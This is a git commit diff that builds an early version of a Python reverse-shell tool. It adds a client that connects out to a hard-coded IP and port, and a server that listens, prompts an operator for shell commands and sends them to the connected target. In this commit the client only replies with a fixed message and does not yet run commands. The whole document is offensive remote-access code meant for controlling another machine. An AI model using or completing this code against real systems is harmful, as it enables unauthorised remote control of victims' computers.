afe5969004fb64fdfe9f0f57bd18911d2cbbf884
Alelizzt <alejandrolistc@hotmail.com>
2019-11-08 17:17:32 -0500

    Implementing send and receive functions

--- reverse_shell/reverse_shell.py
+++ reverse_shell/reverse_shell.py
@@ -1,8 +1,17 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
 import socket
 
 
+
+def shell():
+    command = sock.recv(1024)
+    message = "Hello world"
+    sock.send(message)
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("10.0.2.15",54321))#Change to Server IP
+
+shell()
+
 sock.close()
--- reverse_shell/server.py
+++ reverse_shell/server.py
@@ -1,17 +1,26 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
 import socket
-from termcolor import colored
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-s.bind(("10.0.2.15",54321))#Change to your IP
-s.listen(5)
+def shell():
+    command = raw_input("Shell#~%s: "%str(ip))
+    target.send(command)
+    message = target.recv(1024)
+    print(message)
 
-print(colored("[+] Listening for incoming connections", 'green'))
+def server():
+    global s
+    global ip
+    global target
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("10.0.2.15",54321))#Change to your IP
+    s.listen(5)
 
-target, ip = s.accept()
-print(colored("[+] Connection established From: %s" % str(ip), 'green'))
-s.close()
+    print("[+] Listening for incoming connections")
+    target, ip = s.accept()
+    print("[+] Connection established From: %s" % str(ip))
 
+server()
+shell()
